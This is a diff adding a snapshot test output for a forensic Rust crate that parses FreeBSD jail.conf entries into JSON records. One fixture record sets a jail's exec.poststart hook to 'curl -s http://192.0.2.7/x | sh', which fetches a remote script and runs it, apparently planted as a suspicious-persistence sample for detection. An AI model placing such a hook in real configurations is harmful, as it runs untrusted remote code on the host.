@@ -1,0 +1,8 @@
+---
+source: crates/nixcavate-artifacts/src/bsd/jail.rs
+expression: out
+---
+{"host":"memory","artifact":"jail-conf","source_path":"etc/jail.conf","source_line":2,"jail":"","name":"exec.timeout","value":"60","command":"60"}
+{"host":"memory","artifact":"jail-conf","source_path":"etc/jail.conf","source_line":4,"jail":"web","name":"path","value":"/jails/web","command":""}
+{"host":"memory","artifact":"jail-conf","source_path":"etc/jail.conf","source_line":5,"jail":"web","name":"exec.start","value":"/bin/sh /etc/rc","command":"/bin/sh /etc/rc"}
+{"host":"memory","artifact":"jail-conf","source_path":"etc/jail.conf","source_line":6,"jail":"web","name":"exec.poststart","value":"curl -s http://192.0.2.7/x | sh","command":"curl -s http://192.0.2.7/x | sh"}
